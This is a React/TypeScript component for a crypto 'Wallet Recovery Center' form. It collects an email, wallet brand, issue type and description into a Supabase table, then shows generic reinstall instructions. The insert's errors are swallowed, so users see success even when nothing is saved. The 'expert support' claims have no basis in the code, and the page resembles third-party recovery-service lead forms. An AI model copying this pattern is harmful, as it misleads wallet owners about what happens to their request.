import React, { useState } from 'react';
import { supabase } from '../lib/supabase';
const WALLETS = [
{
  name: 'MetaMask',
  logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/2048px-MetaMask_Fox.svg.png'
},
{
  name: 'Trust Wallet',
  logo: 'https://static.vecteezy.com/system/resources/previews/067/565/496/non_2x/trust-wallet-rounded-logo-design-free-png.png'
},
{
  name: 'Phantom',
  logo: 'https://docs.phantom.com/favicon.svg'
},
{
  name: 'Exodus',
  logo: 'https://www.exodus.com/brand/img/logo-with-halo.png'
},
{
  name: 'Rainbow',
  logo: 'https://play-lh.googleusercontent.com/fMUvmUmIpIDoZGTACYohbY3DE7-24GFkQ21WjVHxa57qluzWrr7khkycE8cz_juhew'
},
{
  name: 'Crypto.com',
  logo: 'https://www.vhv.rs/dpng/d/257-2574815_crypto-com-logo-svg-hd-png-download.png'
},
{
  name: 'ETH Wallet',
  logo: 'https://www.cryptocompare.com/media/35309279/hb-wallet-logo.png'
},
{
  name: 'Ledger',
  logo: 'https://cryptorecovers.com/wp-content/uploads/2025/03/Ledger.png'
},
{
  name: 'Coinbase',
  logo: 'https://images.seeklogo.com/logo-png/44/1/coinbase-coin-logo-png_seeklogo-444569.png'
},
{
  name: 'Coinmama',
  logo: 'https://media.cryptomaniaks.com/images/logos/1739096884479_67a88334f12aaec7e4a46aed.png'
},
{
  name: 'Binance',
  logo: 'https://images.seeklogo.com/logo-png/44/2/binance-smart-chain-bsc-logo-png_seeklogo-446621.png'
}];

const RECOVERY_ISSUES = [
{
  id: 'lost_access',
  label: 'Lost Wallet Access',
  icon: '🔑'
},
{
  id: 'forgotten_password',
  label: 'Forgotten Password',
  icon: '🔒'
},
{
  id: 'lost_seed',
  label: 'Lost Seed Phrase',
  icon: '📋'
},
{
  id: 'hacked',
  label: 'Wallet Compromised',
  icon: '⚠️'
},
{
  id: 'sync_issue',
  label: 'Sync Issues',
  icon: '🔄'
},
{
  id: 'transaction_stuck',
  label: 'Stuck Transaction',
  icon: '⏳'
}];

export function RecoveryPage() {
  const [email, setEmail] = useState('');
  const [selectedWallet, setSelectedWallet] = useState<
    (typeof WALLETS)[0] | null>(
    null);
  const [selectedIssue, setSelectedIssue] = useState('');
  const [description, setDescription] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [submitted, setSubmitted] = useState(false);
  const handleConfirm = async () => {
    if (!email.trim()) {
      setError('Please enter your email address.');
      return;
    }
    if (!selectedWallet) {
      setError('Please select your wallet provider.');
      return;
    }
    if (!selectedIssue) {
      setError('Please select the issue type.');
      return;
    }
    setError('');
    setLoading(true);
    try {
      await supabase.from('recovery_requests').insert([
      {
        email: email.trim(),
        wallet_type: selectedWallet.name,
        issue_type: selectedIssue,
        description: description.trim(),
        status: 'pending',
        created_at: new Date().toISOString()
      }]
      );
    } catch (e) {
      console.error(e);
    }
    setLoading(false);
    setSubmitted(true);
  };
  // ── INSTRUCTION SCREEN after submit ──
  if (submitted) {
    return (
      <div
        className="min-h-screen pt-20 pb-20 px-4 flex items-center justify-center"
        style={{
          background: 'transparent'
        }}>

        <div
          style={{
            maxWidth: 520,
            width: '100%',
            textAlign: 'center',
            background: 'rgba(139,92,246,0.07)',
            backdropFilter: 'blur(24px)',
            WebkitBackdropFilter: 'blur(24px)',
            border: '1px solid rgba(139,92,246,0.3)',
            borderRadius: 20,
            padding: 'clamp(28px, 6vw, 48px)',
            boxShadow: '0 0 60px rgba(139,92,246,0.12)'
          }}>

          <div
            style={{
              width: 72,
              height: 72,
              borderRadius: '50%',
              margin: '0 auto 24px',
              background:
              'linear-gradient(135deg, rgba(245,158,11,0.25), rgba(139,92,246,0.25))',
              border: '2px solid rgba(245,158,11,0.4)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center'
            }}>

            <span
              style={{
                fontSize: 36
              }}>

              🛠️
            </span>
          </div>

          <h2
            style={{
              fontFamily: 'Orbitron, sans-serif',
              fontSize: 'clamp(1.2rem, 4vw, 1.6rem)',
              fontWeight: 800,
              color: 'white',
              margin: '0 0 20px',
              lineHeight: 1.3
            }}>

            Recovery Instructions
          </h2>

          <div
            style={{
              background: 'rgba(245,158,11,0.1)',
              border: '1px solid rgba(245,158,11,0.35)',
              borderRadius: 14,
              padding: '20px 18px',
              marginBottom: 24,
              textAlign: 'left'
            }}>

            <p
              style={{
                fontFamily: 'Inter, sans-serif',
                fontSize: 15,
                color: 'rgba(255,255,255,0.85)',
                lineHeight: 1.7,
                margin: 0
              }}>

              Kindly uninstall your wallet provider and reinstall back to ensure
              proper fix of the wallet.
            </p>
          </div>

          <div
            style={{
              background: 'rgba(239,68,68,0.1)',
              border: '1px solid rgba(239,68,68,0.3)',
              borderRadius: 14,
              padding: '16px 18px',
              marginBottom: 32,
              textAlign: 'left'
            }}>

            <p
              style={{
                fontFamily: 'Inter, sans-serif',
                fontSize: 13,
                color: '#fca5a5',
                lineHeight: 1.6,
                margin: 0
              }}>

              <strong
                style={{
                  color: '#f87171'
                }}>

                ⚠️ Note:
              </strong>{' '}
              Ensure you backed up your wallet phrase before uninstalling and
              reinstalling.
            </p>
          </div>

          <button
            onClick={() => {
              setSubmitted(false);
              setEmail('');
              setSelectedWallet(null);
              setSelectedIssue('');
              setDescription('');
            }}
            style={{
              padding: '12px 32px',
              borderRadius: 12,
              border: 'none',
              cursor: 'pointer',
              background: 'rgba(255,255,255,0.08)',
              color: 'rgba(255,255,255,0.7)',
              fontFamily: 'Inter, sans-serif',
              fontSize: 14,
              fontWeight: 600,
              transition: 'all 0.2s'
            }}>

            ← Back to Recovery Page
          </button>
        </div>
      </div>);

  }
  // ── MAIN FORM ──
  return (
    <div
      className="min-h-screen pt-20 pb-20 px-4 flex items-start justify-center"
      style={{
        background: 'transparent'
      }}>

      <div className="w-full max-w-2xl mt-8">
        {/* Header */}
        <div className="text-center mb-10">
          <div
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: 6,
              padding: '6px 16px',
              borderRadius: 999,
              marginBottom: 20,
              background: 'rgba(245,158,11,0.15)',
              border: '1px solid rgba(245,158,11,0.35)',
              color: '#fbbf24',
              fontSize: 13,
              fontFamily: 'Inter, sans-serif',
              fontWeight: 500
            }}>

            🛡️ Wallet Recovery Center
          </div>
          <h1
            style={{
              fontFamily: 'Orbitron, sans-serif',
              fontSize: 'clamp(2rem, 6vw, 3.5rem)',
              fontWeight: 900,
              color: 'white',
              margin: '0 0 12px',
              lineHeight: 1.15
            }}>

            Recover Your <span className="text-neon-gradient">Wallet</span>
          </h1>
          <p
            style={{
              color: 'rgba(255,255,255,0.55)',
              fontSize: 16,
              fontFamily: 'Inter, sans-serif',
              margin: 0
            }}>

            Our experts will help restore access to your crypto assets
          </p>
        </div>

        {/* Card */}
        <div
          style={{
            background: 'rgba(139,92,246,0.07)',
            backdropFilter: 'blur(24px)',
            WebkitBackdropFilter: 'blur(24px)',
            border: '1px solid rgba(139,92,246,0.3)',
            borderRadius: 20,
            padding: 'clamp(20px, 5vw, 40px)',
            boxShadow: '0 0 60px rgba(245,158,11,0.08)'
          }}>

          {/* Email */}
          <div
            style={{
              marginBottom: 24
            }}>

            <label
              style={{
                display: 'block',
                color: 'rgba(255,255,255,0.75)',
                fontSize: 13,
                fontWeight: 600,
                marginBottom: 8,
                fontFamily: 'Inter, sans-serif',
                letterSpacing: '0.04em',
                textTransform: 'uppercase'
              }}>

              Email Address
            </label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="your@email.com"
              style={{
                width: '100%',
                padding: '14px 16px',
                background: 'rgba(0,0,0,0.4)',
                border: '1px solid rgba(139,92,246,0.35)',
                borderRadius: 12,
                color: 'white',
                fontSize: 15,
                fontFamily: 'Inter, sans-serif',
                outline: 'none',
                boxSizing: 'border-box'
              }}
              onFocus={(e) =>
              e.target.style.borderColor = 'rgba(245,158,11,0.7)'
              }
              onBlur={(e) =>
              e.target.style.borderColor = 'rgba(139,92,246,0.35)'
              } />

          </div>

          {/* Issue type */}
          <div
            style={{
              marginBottom: 24
            }}>

            <label
              style={{
                display: 'block',
                color: 'rgba(255,255,255,0.75)',
                fontSize: 13,
                fontWeight: 600,
                marginBottom: 12,
                fontFamily: 'Inter, sans-serif',
                letterSpacing: '0.04em',
                textTransform: 'uppercase'
              }}>

              Issue Type
            </label>
            <div
              style={{
                display: 'grid',
                gridTemplateColumns: 'repeat(auto-fill, minmax(140px, 1fr))',
                gap: 8
              }}>

              {RECOVERY_ISSUES.map((issue) =>
              <button
                key={issue.id}
                type="button"
                onClick={() => setSelectedIssue(issue.id)}
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: 8,
                  padding: '10px 12px',
                  borderRadius: 12,
                  background:
                  selectedIssue === issue.id ?
                  'rgba(245,158,11,0.2)' :
                  'rgba(255,255,255,0.04)',
                  border:
                  selectedIssue === issue.id ?
                  '1px solid rgba(245,158,11,0.5)' :
                  '1px solid rgba(255,255,255,0.1)',
                  cursor: 'pointer',
                  transition: 'all 0.15s',
                  textAlign: 'left'
                }}>

                  <span
                  style={{
                    fontSize: 16
                  }}>

                    {issue.icon}
                  </span>
                  <span
                  style={{
                    fontSize: 11,
                    color:
                    selectedIssue === issue.id ?
                    'white' :
                    'rgba(255,255,255,0.6)',
                    fontFamily: 'Inter, sans-serif',
                    fontWeight: 500,
                    lineHeight: 1.2
                  }}>

                    {issue.label}
                  </span>
                </button>
              )}
            </div>
          </div>

          {/* Wallet selector */}
          <div
            style={{
              marginBottom: 28
            }}>

            <label
              style={{
                display: 'block',
                color: 'rgba(255,255,255,0.75)',
                fontSize: 13,
                fontWeight: 600,
                marginBottom: 12,
                fontFamily: 'Inter, sans-serif',
                letterSpacing: '0.04em',
                textTransform: 'uppercase'
              }}>

              Wallet Provider
            </label>
            <div
              style={{
                display: 'grid',
                gridTemplateColumns: 'repeat(auto-fill, minmax(90px, 1fr))',
                gap: 10
              }}>

              {WALLETS.map((wallet) => {
                const isSelected = selectedWallet?.name === wallet.name;
                return (
                  <button
                    key={wallet.name}
                    type="button"
                    onClick={() => setSelectedWallet(wallet)}
                    style={{
                      display: 'flex',
                      flexDirection: 'column',
                      alignItems: 'center',
                      gap: 6,
                      padding: '10px 6px',
                      borderRadius: 12,
                      cursor: 'pointer',
                      transition: 'all 0.18s',
                      background: isSelected ?
                      'rgba(245,158,11,0.2)' :
                      'rgba(255,255,255,0.04)',
                      border: isSelected ?
                      '2px solid rgba(245,158,11,0.6)' :
                      '1px solid rgba(255,255,255,0.1)',
                      boxShadow: isSelected ?
                      '0 0 14px rgba(245,158,11,0.25)' :
                      'none',
                      position: 'relative'
                    }}>

                    <div
                      style={{
                        width: 40,
                        height: 40,
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center'
                      }}>

                      <img
                        src={wallet.logo}
                        alt={wallet.name}
                        style={{
                          width: 36,
                          height: 36,
                          objectFit: 'contain'
                        }}
                        onError={(e) => {
                          ;(e.target as HTMLImageElement).style.display = 'none';
                        }} />

                    </div>
                    <span
                      style={{
                        fontSize: 10,
                        color: isSelected ? 'white' : 'rgba(255,255,255,0.6)',
                        fontFamily: 'Inter, sans-serif',
                        fontWeight: 500,
                        textAlign: 'center',
                        lineHeight: 1.2
                      }}>

                      {wallet.name}
                    </span>
                    {isSelected &&
                    <div
                      style={{
                        position: 'absolute',
                        top: 4,
                        right: 4,
                        width: 14,
                        height: 14,
                        borderRadius: '50%',
                        background: '#f59e0b',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center'
                      }}>

                        <svg
                        width="8"
                        height="8"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="white"
                        strokeWidth="3">

                          <path
                          d="M5 13l4 4L19 7"
                          strokeLinecap="round"
                          strokeLinejoin="round" />

                        </svg>
                      </div>
                    }
                  </button>);

              })}
            </div>
          </div>

          {/* Description */}
          <div
            style={{
              marginBottom: 24
            }}>

            <label
              style={{
                display: 'block',
                color: 'rgba(255,255,255,0.75)',
                fontSize: 13,
                fontWeight: 600,
                marginBottom: 8,
                fontFamily: 'Inter, sans-serif',
                letterSpacing: '0.04em',
                textTransform: 'uppercase'
              }}>

              Additional Details{' '}
              <span
                style={{
                  color: 'rgba(255,255,255,0.3)',
                  textTransform: 'none',
                  fontWeight: 400
                }}>

                (optional)
              </span>
            </label>
            <textarea
              value={description}
              onChange={(e) => setDescription(e.target.value)}
              placeholder="Describe your issue..."
              rows={3}
              style={{
                width: '100%',
                padding: '14px 16px',
                background: 'rgba(0,0,0,0.4)',
                border: '1px solid rgba(139,92,246,0.35)',
                borderRadius: 12,
                color: 'white',
                fontSize: 15,
                fontFamily: 'Inter, sans-serif',
                outline: 'none',
                boxSizing: 'border-box',
                resize: 'none'
              }}
              onFocus={(e) =>
              e.target.style.borderColor = 'rgba(245,158,11,0.7)'
              }
              onBlur={(e) =>
              e.target.style.borderColor = 'rgba(139,92,246,0.35)'
              } />

          </div>

          {/* Error */}
          {error &&
          <div
            style={{
              marginBottom: 16,
              padding: '10px 14px',
              borderRadius: 10,
              background: 'rgba(239,68,68,0.1)',
              border: '1px solid rgba(239,68,68,0.35)',
              color: '#f87171',
              fontSize: 13,
              fontFamily: 'Inter, sans-serif'
            }}>

              ⚠️ {error}
            </div>
          }

          {/* Confirm button */}
          <button
            onClick={handleConfirm}
            disabled={loading}
            style={{
              width: '100%',
              padding: '16px',
              borderRadius: 14,
              border: 'none',
              background: loading ?
              'rgba(255,255,255,0.1)' :
              'linear-gradient(135deg, #f59e0b 0%, #ff6b35 40%, #c084fc 80%, #8b5cf6 100%)',
              color: 'white',
              fontFamily: 'Orbitron, sans-serif',
              fontSize: 14,
              fontWeight: 700,
              letterSpacing: '0.06em',
              cursor: loading ? 'not-allowed' : 'pointer',
              opacity: loading ? 0.6 : 1,
              boxShadow: loading ?
              'none' :
              '0 0 30px rgba(245,158,11,0.3), 0 4px 15px rgba(0,0,0,0.3)',
              transition: 'all 0.2s'
            }}>

            {loading ? 'Processing...' : '🔗 Confirm & Recover Wallet'}
          </button>

          <p
            style={{
              textAlign: 'center',
              marginTop: 12,
              fontSize: 11,
              color: 'rgba(255,255,255,0.3)',
              fontFamily: 'Inter, sans-serif'
            }}>

            Secure recovery process • 24/7 expert support
          </p>
        </div>
      </div>
    </div>);

}